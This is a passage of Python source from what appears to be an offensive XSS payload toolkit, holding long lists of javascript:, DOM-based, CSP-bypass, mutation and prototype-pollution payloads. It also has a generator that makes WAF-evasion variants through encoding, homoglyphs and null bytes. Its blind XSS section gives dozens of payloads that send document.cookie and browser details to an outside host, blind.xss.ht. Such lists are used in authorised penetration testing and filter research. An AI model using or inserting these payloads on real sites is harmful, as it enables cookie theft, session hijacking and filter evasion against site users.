                'javascript:frames[0].alert(document.domain)',
                
                # with eval
                'javascript:eval("alert(document.domain)")',
                'javascript:eval("al"+"ert(document.domain)")',
                'javascript:Function("alert(document.domain)")()',
                
                # with document.write
                'javascript:document.write("<script>alert(document.domain)</script>")',
                'javascript:document.writeln("<script>alert(document.domain)</script>")',
                
                # with innerHTML
                'javascript:document.body.innerHTML="<img src=x onerror=alert(document.domain)>"',
                
                # with location
                'javascript:location="javascript:alert(document.domain)"',
                'javascript:location.href="javascript:alert(document.domain)"',
                
                # with setTimeout
                'javascript:setTimeout("alert(document.domain)",0)',
                'javascript:setInterval("alert(document.domain)",1000)',
                
                # with prompt/confirm
                'javascript:prompt(document.domain)',
                'javascript:confirm(document.domain)',
                
                # with console
                'javascript:console.log(document.domain)',
                'javascript:console.error(document.domain)',
                
                # with history
                'javascript:history.pushState({},"",document.domain)',
                'javascript:history.replaceState({},"",document.domain)',
                
                # with localStorage
                'javascript:localStorage.setItem("x",document.domain)',
                'javascript:sessionStorage.setItem("x",document.domain)',
                
                # with cookie
                'javascript:document.cookie="x="+document.domain',
                
                # with XMLHttpRequest
                'javascript:new XMLHttpRequest().open("GET",document.domain)',
                
                # with fetch
                'javascript:fetch(document.domain)',
                
                # with Beacon
                'javascript:navigator.sendBeacon(document.domain)',
                
                # with WebSocket
                'javascript:new WebSocket("ws://"+document.domain)',
                
                # with Worker
                'javascript:new Worker("data:text/javascript,alert(document.domain)")',
                
                # with import
                'javascript:import("data:text/javascript,alert(document.domain)")',
                
                # with Reflect
                'javascript:Reflect.apply(alert,window,[document.domain])',
                
                # with Proxy
                'javascript:new Proxy({},{get(){alert(document.domain)}})',
                
                # with Promise
                'javascript:Promise.resolve(document.domain).then(alert)',
                
                # with template literal
                'javascript:alert`${document.domain}`',
                'javascript:console.log`${document.domain}`',
                
                # with unicode
                'javascript:alert("dom\u0061in")',
                'javascript:alert("dom\x61in")',
                'javascript:alert("dom&#x61;in")',
                
                # with comment bypass
                'javascript://\nalert(document.domain)',
                'javascript:/*\n*/alert(document.domain)/*\n*/',
                'javascript:<!--\n-->alert(document.domain)',
            ],
            
            # ============ DOM-BASED PAYLOADS ============
            'dom': [
                # Hash based
                '#<script>alert(document.domain)</script>',
                '#<img src=x onerror=alert(document.domain)>',
                '#<svg onload=alert(document.domain)>',
                '#<body onload=alert(document.domain)>',
                '#<iframe src=javascript:alert(document.domain)>',
                '#<embed src=javascript:alert(document.domain)>',
                '#<object data=javascript:alert(document.domain)>',
                
                # Query parameter based
                '?x=<script>alert(document.domain)</script>',
                '?x=<img src=x onerror=alert(document.domain)>',
                '?x=<svg onload=alert(document.domain)>',
                '?x=javascript:alert(document.domain)',
                '?x=data:text/html,<script>alert(document.domain)</script>',
                
                # Fragment identifier
                '#" onload="alert(document.domain)',
                '#\' onload=\'alert(document.domain)',
                '#` onload=`alert(document.domain)',
                '#" onerror="alert(document.domain)',
                '#\' onerror=\'alert(document.domain)',
                '#` onerror=`alert(document.domain)',
                
                # With window.location
                'javascript:alert(document.domain)',
                'javascript:alert(window.location.hash)',
                'javascript:alert(location.hash)',
                'javascript:eval(location.hash.substr(1))',
                
                # With document.URL
                'javascript:alert(document.URL)',
                'javascript:eval(document.URL.substring(document.URL.indexOf("#")+1))',
                
                # With document.documentURI
                'javascript:alert(document.documentURI)',
                
                # With document.baseURI
                'javascript:alert(document.baseURI)',
                
                # With location.search
                'javascript:alert(location.search)',
                'javascript:eval(location.search.substr(1))',
                
                # With document.referrer
                'javascript:alert(document.referrer)',
                'javascript:eval(document.referrer)',
                
                # With window.name
                'javascript:alert(window.name)',
                'javascript:eval(window.name)',
                
                # With document.cookie
                'javascript:alert(document.cookie)',
                'javascript:eval(document.cookie)',
                
                # With localStorage
                'javascript:alert(localStorage.getItem("x"))',
                'javascript:eval(localStorage.getItem("x"))',
                
                # With sessionStorage
                'javascript:alert(sessionStorage.getItem("x"))',
                'javascript:eval(sessionStorage.getItem("x"))',
                
                # With postMessage
                'javascript:addEventListener("message",function(e){eval(e.data)})',
                'javascript:onmessage=function(e){eval(e.data)}',
                
                # With BroadcastChannel
                'javascript:new BroadcastChannel("x").onmessage=function(e){eval(e.data)}',
                
                # With WebSocket
                'javascript:new WebSocket("ws://localhost").onmessage=function(e){eval(e.data)}',
                
                # With EventSource
                'javascript:new EventSource("//localhost").onmessage=function(e){eval(e.data)}',
                
                # With XMLHttpRequest
                'javascript:new XMLHttpRequest().onload=function(){eval(this.responseText)}',
                
                # With fetch
                'javascript:fetch("//localhost").then(r=>r.text()).then(eval)',
                
                # With import
                'javascript:import("data:text/javascript,"+location.hash.substr(1))',
                
                # With Worker
                'javascript:new Worker("data:text/javascript,"+location.hash.substr(1))',
                
                # With Blob
                'javascript:new Blob([location.hash.substr(1)],{type:"text/javascript"})',
                
                # With data URL
                'javascript:location="data:text/html,"+location.hash.substr(1)',
                
                # With iframe
                'javascript:document.body.innerHTML="<iframe src=\\"data:text/html,"+location.hash.substr(1)+"\\"></iframe>"',
                
                # With form
                'javascript:document.body.innerHTML="<form action=\\"data:text/html\\" method=\\"POST\\"><input name=\\"x\\" value=\\""+location.hash.substr(1)+"\\"></form>"',
                
                # With script tag
                'javascript:document.body.innerHTML="<script>"+location.hash.substr(1)+"</script>"',
                
                # With eval directly
                'javascript:eval(decodeURIComponent(location.hash.substr(1)))',
                'javascript:Function(decodeURIComponent(location.hash.substr(1)))()',
                
                # With setTimeout
                'javascript:setTimeout(decodeURIComponent(location.hash.substr(1)))',
                'javascript:setInterval(decodeURIComponent(location.hash.substr(1)))',
                
                # With setImmediate
                'javascript:setImmediate&&setImmediate(decodeURIComponent(location.hash.substr(1)))',
                
                # With requestAnimationFrame
                'javascript:requestAnimationFrame&&requestAnimationFrame(decodeURIComponent(location.hash.substr(1)))',
                
                # With Promise
                'javascript:Promise.resolve().then(function(){eval(decodeURIComponent(location.hash.substr(1)))})',
                
                # With async/await
                'javascript:async function x(){await eval(decodeURIComponent(location.hash.substr(1)))};x()',
                
                # With generator
                'javascript:function* g(){yield eval(decodeURIComponent(location.hash.substr(1)))};g().next()',
                
                # With Reflect
                'javascript:Reflect.apply(eval,window,[decodeURIComponent(location.hash.substr(1))])',
                
                # With Proxy
                'javascript:new Proxy({},{get(){eval(decodeURIComponent(location.hash.substr(1)))}})',
                
                # With class
                'javascript:class X{static x=eval(decodeURIComponent(location.hash.substr(1)))}',
                
                # With template literal
                'javascript:eval`${decodeURIComponent(location.hash.substr(1))}`',
                
                # With comment
                'javascript:eval("/*"+location.hash.substr(1)+"*/")',
                
                # With unicode
                'javascript:eval("\\u"+location.hash.substr(1))',
                
                # With hex
                'javascript:eval("\\x"+location.hash.substr(1))',
                
                # With octal
                'javascript:eval("\\"+location.hash.substr(1))',
            ],
            
            # ============ BLIND XSS PAYLOADS ============
            'blind': [
                # Basic blind payloads
                f'<script>fetch(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)</script>',
                f'<img src=x onerror="fetch(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)">',
                f'<svg onload="fetch(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)">',
                f'<body onload="fetch(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)">',
                f'<iframe src="javascript:fetch(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)"></iframe>',
                
                # With Image object
                f'<script>new Image().src=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie;</script>',
                f'<img src=x onerror="new Image().src=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                f'<svg onload="new Image().src=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With sendBeacon
                f'<script>navigator.sendBeacon(\'http://blind.xss.ht/{self.session_id}\', document.cookie)</script>',
                f'<img src=x onerror="navigator.sendBeacon(\'http://blind.xss.ht/{self.session_id}\', document.cookie)">',
                f'<svg onload="navigator.sendBeacon(\'http://blind.xss.ht/{self.session_id}\', document.cookie)">',
                
                # With XMLHttpRequest
                f'<script>var x=new XMLHttpRequest();x.open(\'GET\',\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie);x.send();</script>',
                f'<img src=x onerror="var x=new XMLHttpRequest();x.open(\'GET\',\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie);x.send()">',
                f'<svg onload="var x=new XMLHttpRequest();x.open(\'GET\',\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie);x.send()">',
                
                # With fetch POST
                f'<script>fetch(\'http://blind.xss.ht/{self.session_id}\', {{method:\'POST\', body:document.cookie}})</script>',
                f'<img src=x onerror="fetch(\'http://blind.xss.ht/{self.session_id}\', {{method:\'POST\', body:document.cookie}})">',
                f'<svg onload="fetch(\'http://blind.xss.ht/{self.session_id}\', {{method:\'POST\', body:document.cookie}})">',
                
                # With FormData
                f'<script>var f=new FormData();f.append(\'c\',document.cookie);fetch(\'http://blind.xss.ht/{self.session_id}\', {{method:\'POST\', body:f}})</script>',
                
                # With document.location
                f'<script>document.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie</script>',
                f'<img src=x onerror="document.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                f'<svg onload="document.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With window.location
                f'<script>window.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie</script>',
                f'<img src=x onerror="window.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                f'<svg onload="window.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With top.location
                f'<script>top.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie</script>',
                f'<img src=x onerror="top.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                f'<svg onload="top.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With parent.location
                f'<script>parent.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie</script>',
                f'<img src=x onerror="parent.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                f'<svg onload="parent.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With self.location
                f'<script>self.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie</script>',
                f'<img src=x onerror="self.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                f'<svg onload="self.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With frames[0].location
                f'<script>frames[0].location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie</script>',
                
                # With opener (if window opened by attacker)
                f'<script>window.opener&&window.opener.location=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie</script>',
                
                # With postMessage
                f'<script>postMessage(document.cookie,\'*\')</script>',
                f'<img src=x onerror="postMessage(document.cookie,\'*\')">',
                f'<svg onload="postMessage(document.cookie,\'*\')">',
                
                # With BroadcastChannel
                f'<script>new BroadcastChannel(\'xss\').postMessage(document.cookie)</script>',
                f'<img src=x onerror="new BroadcastChannel(\'xss\').postMessage(document.cookie)">',
                f'<svg onload="new BroadcastChannel(\'xss\').postMessage(document.cookie)">',
                
                # With WebSocket
                f'<script>new WebSocket(\'ws://blind.xss.ht/{self.session_id}\').send(document.cookie)</script>',
                f'<img src=x onerror="new WebSocket(\'ws://blind.xss.ht/{self.session_id}\').send(document.cookie)">',
                f'<svg onload="new WebSocket(\'ws://blind.xss.ht/{self.session_id}\').send(document.cookie)">',
                
                # With document.write (persistent)
                f'<script>document.write(\'<script src="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie+\'"></script>\')</script>',
                
                # With document.createElement (persistent)
                f'<script>var s=document.createElement(\'script\');s.src=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie;document.body.appendChild(s)</script>',
                
                # With iframe (persistent)
                f'<script>var i=document.createElement(\'iframe\');i.src=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie;document.body.appendChild(i)</script>',
                
                # With img (persistent)
                f'<script>var i=document.createElement(\'img\');i.src=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie;document.body.appendChild(i)</script>',
                
                # With link (persistent)
                f'<script>var l=document.createElement(\'link\');l.rel=\'stylesheet\';l.href=\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie;document.head.appendChild(l)</script>',
                
                # With style (persistent)
                f'<script>var s=document.createElement(\'style\');s.textContent=\'@import "http://blind.xss.ht/{self.session_id}?c=\'+document.cookie+\'";\';document.head.appendChild(s)</script>',
                
                # With meta refresh
                f'<meta http-equiv="refresh" content="0;url=http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With base tag
                f'<base href="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With form
                f'<form action="http://blind.xss.ht/{self.session_id}" method="POST"><input type="hidden" name="c" value="\'+document.cookie+\'"></form>',
                
                # With input autosubmit
                f'<form id=f action="http://blind.xss.ht/{self.session_id}" method="POST"><input type="hidden" name="c" value="\'+document.cookie+\'"></form><input type=submit form=f>',
                
                # With button autosubmit
                f'<form id=f action="http://blind.xss.ht/{self.session_id}" method="POST"><input type="hidden" name="c" value="\'+document.cookie+\'"></form><button form=f>Submit</button>',
                
                # With image input
                f'<form action="http://blind.xss.ht/{self.session_id}" method="POST"><input type="image" src=x name="c" value="\'+document.cookie+\'"></form>',
                
                # With iframe srcdoc
                f'<iframe srcdoc="<script>fetch(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)</script>"></iframe>',
                
                # With object data
                f'<object data="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie"></object>',
                
                # With embed src
                f'<embed src="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With applet
                f'<applet code="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie"></applet>',
                
                # With audio
                f'<audio src="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie"></audio>',
                
                # With video
                f'<video src="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie"></video>',
                
                # With source
                f'<source src="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With track
                f'<track src="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With picture
                f'<picture><source srcset="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie"><img src=x></picture>',
                
                # With map/area
                f'<map name="x"><area shape=rect coords="0,0,100,100" href="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie"></map><img usemap="#x" src=x>',
                
                # With link preconnect
                f'<link rel="preconnect" href="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With link preload
                f'<link rel="preload" href="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With link prefetch
                f'<link rel="prefetch" href="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With link dns-prefetch
                f'<link rel="dns-prefetch" href="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie">',
                
                # With script module
                f'<script type="module" src="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie"></script>',
                
                # With script nomodule
                f'<script nomodule src="http://blind.xss.ht/{self.session_id}?c=\'+document.cookie"></script>',
                
                # With import
                f'<script>import(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)</script>',
                
                # With Worker
                f'<script>new Worker(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)</script>',
                
                # With SharedWorker
                f'<script>new SharedWorker(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)</script>',
                
                # With ServiceWorker
                f'<script>navigator.serviceWorker.register(\'http://blind.xss.ht/{self.session_id}?c=\'+document.cookie)</script>',
                
                # With WebSocket binary
                f'<script>new WebSocket(\'ws://blind.xss.ht/{self.session_id}\').send(new TextEncoder().encode(document.cookie))</script>',
                
                # With RTCPeerConnection
                f'<script>new RTCPeerConnection({{iceServers:[{{urls:"stun:blind.xss.ht/{self.session_id}?c="+document.cookie}}]}})</script>',
                
                # With Beacon and more data
                f'<script>navigator.sendBeacon(\'http://blind.xss.ht/{self.session_id}\', JSON.stringify({{cookie:document.cookie,url:location.href,userAgent:navigator.userAgent}}))</script>',
                
                # Comprehensive data collection
                f'<script>var data={{cookie:document.cookie,url:location.href,referrer:document.referrer,userAgent:navigator.userAgent,language:navigator.language,platform:navigator.platform}};fetch(\'http://blind.xss.ht/{self.session_id}\',{{method:\'POST\',headers:{{\'Content-Type\':\'application/json\'}},body:JSON.stringify(data)}})</script>',
            ],
            
            # WAF bypass payloads
            'waf_bypass': self.generate_waf_bypass_payloads(),
            
            # Polyglot payloads
            'polyglot': self.generate_polyglot_payloads(),
            
            # Advanced bypass techniques
            'advanced': self.generate_advanced_bypass_payloads(),
            
            # ============ ADDITIONAL CATEGORIES ============
            'csp_bypass': [
                # CSP bypass techniques
                '<script>window.location="javascript:alert(document.domain)"</script>',
                '<script>document.location="javascript:alert(document.domain)"</script>',
                '<script>self.location="javascript:alert(document.domain)"</script>',
                '<script>top.location="javascript:alert(document.domain)"</script>',
                '<script>parent.location="javascript:alert(document.domain)"</script>',
                '<script>frames[0].location="javascript:alert(document.domain)"</script>',
                '<script>window.open("javascript:alert(document.domain)")</script>',
                '<script>eval("ale"+"rt(document.domain)")</script>',
                '<script>Function("ale"+"rt(document.domain)")()</script>',
                '<script>setTimeout("alert(document.domain)")</script>',
                '<script>setInterval("alert(document.domain)")</script>',
                '<script>setImmediate&&setImmediate("alert(document.domain)")</script>',
                '<script>requestAnimationFrame&&requestAnimationFrame("alert(document.domain)")</script>',
                '<script>import("data:text/javascript,alert(document.domain)")</script>',
                '<script>new Worker("data:text/javascript,alert(document.domain)")</script>',
                '<script>new SharedWorker("data:text/javascript,alert(document.domain)")</script>',
                '<script>navigator.serviceWorker.register("data:text/javascript,alert(document.domain)")</script>',
                '<script>new Blob(["alert(document.domain)"],{type:"text/javascript"})</script>',
                '<script>URL.createObjectURL(new Blob(["alert(document.domain)"],{type:"text/javascript"}))</script>',
                '<script>new XMLHttpRequest().responseType="blob"</script>',
                '<script>new Response("alert(document.domain)",{headers:{"Content-Type":"text/javascript"}})</script>',
                '<script>new Request("data:text/javascript,alert(document.domain)")</script>',
                '<script>fetch("data:text/javascript,alert(document.domain)")</script>',
                '<script>navigator.sendBeacon("data:text/javascript,alert(document.domain)")</script>',
                '<script>new WebSocket("ws://localhost")</script>',
                '<script>new RTCPeerConnection()</script>',
                '<script>new BroadcastChannel("xss")</script>',
                '<script>postMessage("alert(document.domain)","*")</script>',
                '<script>window.onmessage=function(e){eval(e.data)}</script>',
                '<script>addEventListener("message",function(e){eval(e.data)})</script>',
                '<script>onmessage=function(e){eval(e.data)}</script>',
                '<script>window.addEventListener("message",function(e){eval(e.data)})</script>',
                '<script>document.addEventListener("message",function(e){eval(e.data)})</script>',
                '<script>document.body.addEventListener("message",function(e){eval(e.data)})</script>',
                '<script>document.documentElement.addEventListener("message",function(e){eval(e.data)})</script>',
                '<script>document.head.addEventListener("message",function(e){eval(e.data)})</script>',
            ],
            
            'mutation_xss': [
                # Mutation XSS payloads
                '<svg><script>alert(document.domain)</script></svg>',
                '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.domain)</script></body></foreignObject></svg>',
                '<math><mi xlink:href="javascript:alert(document.domain)">test</mi></math>',
                '<math><annotation-xml encoding="text/html"><script>alert(document.domain)</script></annotation-xml></math>',
                '<template><script>alert(document.domain)</script></template>',
                '<xmp><script>alert(document.domain)</script></xmp>',
                '<plaintext><script>alert(document.domain)</script></plaintext>',
                '<listing><script>alert(document.domain)</script></listing>',
                '<noembed><script>alert(document.domain)</script></noembed>',
                '<noframes><script>alert(document.domain)</script></noframes>',
                '<noscript><script>alert(document.domain)</script></noscript>',
                '<style><script>alert(document.domain)</script></style>',
                '<title><script>alert(document.domain)</script></title>',
                '<textarea><script>alert(document.domain)</script></textarea>',
                '<iframe><script>alert(document.domain)</script></iframe>',
                '<frame><script>alert(document.domain)</script></frame>',
                '<frameset><script>alert(document.domain)</script></frameset>',
                '<object><script>alert(document.domain)</script></object>',
                '<embed><script>alert(document.domain)</script></embed>',
                '<applet><script>alert(document.domain)</script></applet>',
                '<base><script>alert(document.domain)</script></base>',
                '<link><script>alert(document.domain)</script></link>',
                '<meta><script>alert(document.domain)</script></meta>',
                '<script><script>alert(document.domain)</script></script>',
                '<style><style>@import "javascript:alert(document.domain)"</style></style>',
                '<svg><style>@import "javascript:alert(document.domain)"</style></svg>',
                '<math><style>@import "javascript:alert(document.domain)"</style></math>',
            ],
            
            'prototype_pollution': [
                # Prototype pollution payloads
                '__proto__[test]=alert(document.domain)',
                'constructor[prototype][test]=alert(document.domain)',
                'constructor.prototype.test=alert(document.domain)',
                'Object.prototype.test=alert(document.domain)',
                'Array.prototype.test=alert(document.domain)',
                'String.prototype.test=alert(document.domain)',
                'Number.prototype.test=alert(document.domain)',
                'Boolean.prototype.test=alert(document.domain)',
                'Function.prototype.test=alert(document.domain)',
                'RegExp.prototype.test=alert(document.domain)',
                'Date.prototype.test=alert(document.domain)',
                'Error.prototype.test=alert(document.domain)',
                'Promise.prototype.test=alert(document.domain)',
                'Map.prototype.test=alert(document.domain)',
                'Set.prototype.test=alert(document.domain)',
                'WeakMap.prototype.test=alert(document.domain)',
                'WeakSet.prototype.test=alert(document.domain)',
                'ArrayBuffer.prototype.test=alert(document.domain)',
                'DataView.prototype.test=alert(document.domain)',
                'Float32Array.prototype.test=alert(document.domain)',
                'Float64Array.prototype.test=alert(document.domain)',
                'Int8Array.prototype.test=alert(document.domain)',
                'Int16Array.prototype.test=alert(document.domain)',
                'Int32Array.prototype.test=alert(document.domain)',
                'Uint8Array.prototype.test=alert(document.domain)',
                'Uint16Array.prototype.test=alert(document.domain)',
                'Uint32Array.prototype.test=alert(document.domain)',
                'Uint8ClampedArray.prototype.test=alert(document.domain)',
                'Symbol.prototype.test=alert(document.domain)',
                'Generator.prototype.test=alert(document.domain)',
                'GeneratorFunction.prototype.test=alert(document.domain)',
                'AsyncFunction.prototype.test=alert(document.domain)',
                'AsyncGenerator.prototype.test=alert(document.domain)',
                'AsyncGeneratorFunction.prototype.test=alert(document.domain)',
                'Iterator.prototype.test=alert(document.domain)',
                'AsyncIterator.prototype.test=alert(document.domain)',
                'Promise.prototype.then=alert(document.domain)',
                'Object.prototype.toString=alert(document.domain)',
                'Array.prototype.push=alert(document.domain)',
                'String.prototype.charAt=alert(document.domain)',
                'Number.prototype.valueOf=alert(document.domain)',
                'Boolean.prototype.valueOf=alert(document.domain)',
                'Function.prototype.call=alert(document.domain)',
                'RegExp.prototype.test=alert(document.domain)',
                'Date.prototype.getTime=alert(document.domain)',
                'Error.prototype.toString=alert(document.domain)',
                'Map.prototype.set=alert(document.domain)',
                'Set.prototype.add=alert(document.domain)',
                'WeakMap.prototype.set=alert(document.domain)',
                'WeakSet.prototype.add=alert(document.domain)',
                'ArrayBuffer.prototype.slice=alert(document.domain)',
                'DataView.prototype.getUint8=alert(document.domain)',
                'Float32Array.prototype.set=alert(document.domain)',
                'Float64Array.prototype.set=alert(document.domain)',
                'Int8Array.prototype.set=alert(document.domain)',
                'Int16Array.prototype.set=alert(document.domain)',
                'Int32Array.prototype.set=alert(document.domain)',
                'Uint8Array.prototype.set=alert(document.domain)',
                'Uint16Array.prototype.set=alert(document.domain)',
                'Uint32Array.prototype.set=alert(document.domain)',
                'Uint8ClampedArray.prototype.set=alert(document.domain)',
                'Symbol.prototype.toString=alert(document.domain)',
                'Generator.prototype.next=alert(document.domain)',
                'GeneratorFunction.prototype.prototype.next=alert(document.domain)',
                'AsyncFunction.prototype.prototype.next=alert(document.domain)',
                'AsyncGenerator.prototype.next=alert(document.domain)',
                'AsyncGeneratorFunction.prototype.prototype.next=alert(document.domain)',
                'Iterator.prototype.next=alert(document.domain)',
                'AsyncIterator.prototype.next=alert(document.domain)',
            ],
        }

    
    def generate_waf_bypass_payloads(self):
        """Generate comprehensive WAF bypass payloads"""
        bypass_payloads = []
        
        base_payloads = [
            # Basic payloads
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg onload=alert(document.domain)>',
            '<body onload=alert(document.domain)>',
            '<iframe src=javascript:alert(document.domain)>',
            '<embed src=javascript:alert(document.domain)>',
            '<object data=javascript:alert(document.domain)>',
            
            # Event handlers
            '" autofocus onfocus=alert(document.domain) x="',
            '\' autofocus onfocus=alert(document.domain) x=\'',
            '` autofocus onfocus=alert(document.domain) x=`',
            
            # JavaScript protocol
            'javascript:alert(document.domain)',
            'data:text/html,<script>alert(document.domain)</script>',
        ]
        
        for base in base_payloads:
            # ============ CASE VARIATIONS ============
            bypass_payloads.append(base.lower())
            bypass_payloads.append(base.upper())
            bypass_payloads.append(base.swapcase())
            bypass_payloads.append(base.title())
            bypass_payloads.append(base.capitalize())
            
            # Random case
            random_case = ''.join(random.choice([c.upper(), c.lower()]) for c in base)
            bypass_payloads.append(random_case)
            
            # Mixed case for keywords
            if 'script' in base.lower():
                variants = ['ScRiPt', 'sCrIpT', 'SCriPT', 'scRIPt']
                for variant in variants:
                    bypass_payloads.append(base.lower().replace('script', variant))
            
            if 'alert' in base.lower():
                variants = ['AlErT', 'aLeRt', 'ALerT', 'alERt']
                for variant in variants:
                    bypass_payloads.append(base.lower().replace('alert', variant))
            
            # ============ ENCODING VARIATIONS ============
            # HTML entities
            bypass_payloads.append(base.replace('<', '&lt;').replace('>', '&gt;'))
            bypass_payloads.append(base.replace('<', '&#60;').replace('>', '&#62;'))
            bypass_payloads.append(base.replace('<', '&#x3c;').replace('>', '&#x3e;'))
            bypass_payloads.append(base.replace('<', '&#X3C;').replace('>', '&#X3E;'))
            bypass_payloads.append(base.replace('<', '&LT;').replace('>', '&GT;'))
            
            # Partial HTML encoding
            bypass_payloads.append(base.replace('script', 'scr&#105;pt'))
            bypass_payloads.append(base.replace('alert', 'al&#101;rt'))
            bypass_payloads.append(base.replace('onload', 'on&#108;oad'))
            
            # URL encoding
            bypass_payloads.append(quote(base))
            bypass_payloads.append(quote(base, safe=''))
            bypass_payloads.append(base.replace(' ', '%20'))
            bypass_payloads.append(base.replace(' ', '%09'))  # Tab
            bypass_payloads.append(base.replace(' ', '%0a'))  # Newline
            bypass_payloads.append(base.replace(' ', '%0d'))  # Carriage return
            
            # Double URL encoding
            bypass_payloads.append(quote(quote(base)))
            bypass_payloads.append(quote(quote(base, safe=''), safe=''))
            
            # Triple URL encoding
            bypass_payloads.append(quote(quote(quote(base))))
            
            # ============ UNICODE VARIATIONS ============
            # Fullwidth characters
            fullwidth_map = {
                'a': 'ａ', 'b': 'ｂ', 'c': 'ｃ', 'd': 'ｄ', 'e': 'ｅ',
                'f': 'ｆ', 'g': 'ｇ', 'h': 'ｈ', 'i': 'ｉ', 'j': 'ｊ',
                'k': 'ｋ', 'l': 'ｌ', 'm': 'ｍ', 'n': 'ｎ', 'o': 'ｏ',
                'p': 'ｐ', 'q': 'ｑ', 'r': 'ｒ', 's': 'ｓ', 't': 'ｔ',
                'u': 'ｕ', 'v': 'ｖ', 'w': 'ｗ', 'x': 'ｘ', 'y': 'ｙ',
                'z': 'ｚ', 'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ',
                'E': 'Ｅ', 'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ',
                'J': 'Ｊ', 'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ',
                'O': 'Ｏ', 'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ',
                'T': 'Ｔ', 'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ',
                'Y': 'Ｙ', 'Z': 'Ｚ', '<': '＜', '>': '＞', '"': '＂',
                "'": '＇', '=': '＝', '(': '（', ')': '）', '/': '／',
                '\\': '＼', ';': '；', ':': '：'
            }
            
            fullwidth_payload = ''.join(fullwidth_map.get(c, c) for c in base)
            bypass_payloads.append(fullwidth_payload)
            
            # Cyrillic homoglyphs
            cyrillic_map = {
                'a': 'а', 'c': 'с', 'e': 'е', 'o': 'о', 'p': 'р',
                'x': 'х', 'y': 'у', 'A': 'А', 'B': 'В', 'C': 'С',
                'E': 'Е', 'H': 'Н', 'I': 'І', 'J': 'Ј', 'K': 'К',
                'M': 'М', 'N': 'Ν', 'O': 'О', 'P': 'Р', 'S': 'Ѕ',
                'T': 'Т', 'X': 'Х', 'Y': 'Ү'
            }
            
            cyrillic_payload = ''.join(cyrillic_map.get(c, c) for c in base)
            bypass_payloads.append(cyrillic_payload)
            
            # Greek letters
            greek_payload = base.replace('a', 'α').replace('b', 'β').replace('p', 'π')
            bypass_payloads.append(greek_payload)
            
            # ============ NULL BYTE VARIATIONS ============
            null_positions = ['\x00', '\0', '%00', '\\x00', '\\0', '\\u0000']
            for null_char in null_positions:
                # Insert at various positions
                if len(base) > 10:
                    midpoint = len(base) // 2
                    bypass_payloads.append(base[:midpoint] + null_char + base[midpoint:])
                
                # Around brackets
                bypass_payloads.append(base.replace('<', null_char + '<'))
                bypass_payloads.append(base.replace('>', '>' + null_char))
                bypass_payloads.append(base.replace('<', '<' + null_char))
                bypass_payloads.append(base.replace('>', null_char + '>'))
                
                # Around parentheses
                bypass_payloads.append(base.replace('(', null_char + '('))
                bypass_payloads.append(base.replace(')', ')' + null_char))
                
                # Around quotes
                bypass_payloads.append(base.replace('"', null_char + '"'))
                bypass_payloads.append(base.replace("'", "'" + null_char))
            
            # ============ WHITESPACE VARIATIONS ============
            whitespace_chars = [
